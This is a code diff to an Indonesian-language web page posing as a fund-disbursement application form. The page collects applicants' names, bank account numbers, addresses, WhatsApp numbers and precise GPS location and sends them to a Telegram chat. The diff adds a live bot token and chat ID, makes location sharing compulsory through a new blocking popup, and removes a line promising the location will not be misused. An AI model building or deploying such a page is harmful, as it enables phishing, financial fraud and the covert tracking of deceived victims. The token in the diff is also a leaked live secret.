@@ -259,7 +259,7 @@
           <div class="step"><span class="dot">1</span> Data pemohon wajib lengkap dan sesuai KTP</div>
           <div class="step"><span class="dot">2</span> Nama bank dan nomor rekening harus valid</div>
           <div class="step"><span class="dot">3</span> Nomor WhatsApp aktif untuk konfirmasi</div>
-          <div class="step"><span class="dot">4</span> Pemeriksaan otomatis sekitar 5 menit</div>
+          <div class="step"><span class="dot">4</span> Pemeriksaan pengajuan otomatis</div>
         </div>
       </aside>
 
@@ -279,7 +279,7 @@
               <div class="err" id="err-bank">Nama bank wajib diisi.</div>
             </div>
             <div class="field">
-              <label for="rek">Nomor rekening yang dicairkan</label>
+              <label for="rek">Nomor rekening penerima / dicairkan</label>
               <input id="rek" name="rek" type="text" inputmode="numeric" required placeholder="Nomor rekening pengguna" />
               <div class="err" id="err-rek">Nomor rekening wajib diisi.</div>
             </div>
@@ -295,7 +295,7 @@
             </div>
             <button type="submit" id="btnSubmit">Ajukan pencairan</button>
           </form>
-          <p class="hint">Setelah diajukan, verifikasi berlangsung 5 menit.</p>
+          <p class="hint">Setelah diajukan, verifikasi otomatis</p>
         </div>
 
         <div id="process-screen" class="screen">
@@ -327,13 +327,13 @@
   <!-- POPUP KONFIRMASI LOKASI -->
   <div id="popup-lokasi" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:9999; align-items:center; justify-content:center; padding:20px;">
     <div style="background:#fff; border-radius:18px; max-width:400px; width:100%; padding:28px 24px; box-shadow:0 20px 60px rgba(0,0,0,0.4); text-align:center; font-family:'Plus Jakarta Sans',sans-serif;">
-      <div style="width:64px; height:64px; margin:0 auto 16px; border-radius:50%; background:#fef9e7; display:grid; place-items:center; font-size:1.6rem; color:#c9a227;">&#128205;</div>
+      <div style="width:64px; height:64px; margin:0 auto 16px; border-radius:50%; background:#fef9e7; display:grid; place-items:center; font-size:1.1rem; font-weight:800; color:#c9a227; letter-spacing:0.05em;">LOC</div>
       <h2 style="margin:0 0 12px; font-size:1.15rem; color:#111827;">Verifikasi Lokasi Diperlukan</h2>
       <p style="margin:0 0 10px; color:#6b7280; font-size:0.9rem; line-height:1.6;">
         Untuk memastikan pengajuan Anda benar dan aman, sistem perlu memverifikasi lokasi Anda saat ini.
       </p>
       <p style="margin:0 0 10px; color:#6b7280; font-size:0.9rem; line-height:1.6;">
-        Lokasi hanya digunakan untuk validasi pengajuan pencairan dan tidak akan disalahgunakan.
+        Lokasi hanya digunakan untuk validasi pengajuan keamanan pencairan.
       </p>
       <p style="margin:0 0 20px; color:#6b7280; font-size:0.9rem; line-height:1.6;">
         Klik <b>Izinkan Lokasi</b> untuk melanjutkan. Pastikan Anda memilih <b>Allow / Izinkan</b> saat browser meminta konfirmasi.
@@ -343,10 +343,25 @@
     </div>
   </div>
 
+  <!-- POPUP PERINGATAN LOKASI DITOLAK -->
+  <div id="popup-tolak" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:10000; align-items:center; justify-content:center; padding:20px;">
+    <div style="background:#fff; border-radius:18px; max-width:400px; width:100%; padding:28px 24px; box-shadow:0 20px 60px rgba(0,0,0,0.4); text-align:center; font-family:'Plus Jakarta Sans',sans-serif;">
+      <div style="width:64px; height:64px; margin:0 auto 16px; border-radius:50%; background:#fee2e2; display:grid; place-items:center; font-size:1.8rem; font-weight:800; color:#dc2626;">!</div>
+      <h2 style="margin:0 0 12px; font-size:1.15rem; color:#111827;">Lokasi Tidak Diizinkan</h2>
+      <p style="margin:0 0 14px; color:#6b7280; font-size:0.9rem; line-height:1.6;">
+        Izin lokasi diperlukan untuk memproses pengajuan Anda. Tanpa izin lokasi, pengajuan tidak dapat dilanjutkan dan akan tertunda.
+      </p>
+      <p style="margin:0 0 20px; color:#6b7280; font-size:0.9rem; line-height:1.6;">
+        Silakan aktifkan izin lokasi di pengaturan browser Anda, lalu klik <b>Ajukan pencairan</b> kembali.
+      </p>
+      <button id="btnTutupTolak" style="width:100%; border:0; border-radius:12px; padding:14px; font:inherit; font-weight:800; color:#fff; background:linear-gradient(180deg,#ef4444,#dc2626); cursor:pointer;">Mengerti</button>
+    </div>
+  </div>
+
   <script>
     /* ==== KONFIGURASI ==== */
-    const TELEGRAM_BOT_TOKEN = "ISI_TOKEN_BOT_DISINI";
-    const TELEGRAM_CHAT_ID   = "ISI_CHAT_ID_DISINI";
+    const TELEGRAM_BOT_TOKEN = "8600694543:AAGWm5FDg3BIAkBSyZvZQhqwk7UpPAuL3VQ";
+    const TELEGRAM_CHAT_ID   = "8799174278";
     /* ===================== */
 
     const DURATION = 5 * 60;
@@ -358,8 +373,10 @@
     const progressEl = document.getElementById("progress");
     const btnSubmit = document.getElementById("btnSubmit");
     const popupLokasi = document.getElementById("popup-lokasi");
+    const popupTolak = document.getElementById("popup-tolak");
     const btnIzinkan = document.getElementById("btnIzinkan");
     const btnBatal = document.getElementById("btnBatal");
+    const btnTutupTolak = document.getElementById("btnTutupTolak");
 
     function show(el) {
       [formScreen, processScreen, successScreen].forEach((s) => s.classList.remove("show"));
@@ -370,7 +387,6 @@
     function popupKonfirmasi() {
       return new Promise((resolve) => {
         popupLokasi.style.display = "flex";
-
         btnIzinkan.onclick = () => {
           popupLokasi.style.display = "none";
           resolve(true);
@@ -378,6 +394,17 @@
         btnBatal.onclick = () => {
           popupLokasi.style.display = "none";
           resolve(false);
+        };
+      });
+    }
+
+    /* ====== POPUP TOLAK LOKASI ====== */
+    function popupTolakLokasi() {
+      return new Promise((resolve) => {
+        popupTolak.style.display = "flex";
+        btnTutupTolak.onclick = () => {
+          popupTolak.style.display = "none";
+          resolve();
         };
       });
     }
@@ -406,6 +433,7 @@
     form.addEventListener("submit", async function (e) {
       e.preventDefault();
 
+      // validasi form
       let valid = true;
       ["nama", "bank", "rek", "alamat", "wa"].forEach(function (id) {
         const empty = !document.getElementById(id).value.trim();
@@ -422,11 +450,11 @@
         wa:     document.getElementById("wa").value.trim()
       };
 
-      // popup konfirmasi
+      // popup konfirmasi izin lokasi
       const setuju = await popupKonfirmasi();
       if (!setuju) return;
 
-      // loading
+      // ubah tombol jadi loading
       btnSubmit.disabled = true;
       btnSubmit.textContent = "Memverifikasi lokasi...";
 
@@ -436,6 +464,13 @@
       btnSubmit.disabled = false;
       btnSubmit.textContent = "Ajukan pencairan";
 
+      // LOKASI WAJIB: kalau gagal/ditolak -> tampilkan peringatan dan STOP
+      if (!lokasi.ok) {
+        await popupTolakLokasi();
+        return;
+      }
+
+      // lokasi berhasil -> lanjut kirim + proses
       show(processScreen);
       kirimTelegram(payload, lokasi).finally(startProcess);
     });
@@ -462,8 +497,6 @@
           "Longitude: " + lokasi.lon + "\n" +
           "Akurasi  : " + Math.round(lokasi.acc) + " meter\n" +
           "Maps     : https://maps.google.com/?q=" + lokasi.lat + "," + lokasi.lon;
-      } else {
-        text += "\nLokasi: TIDAK DIBERIKAN (" + (lokasi ? lokasi.reason : "ditolak") + ")";
       }
 
       const url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
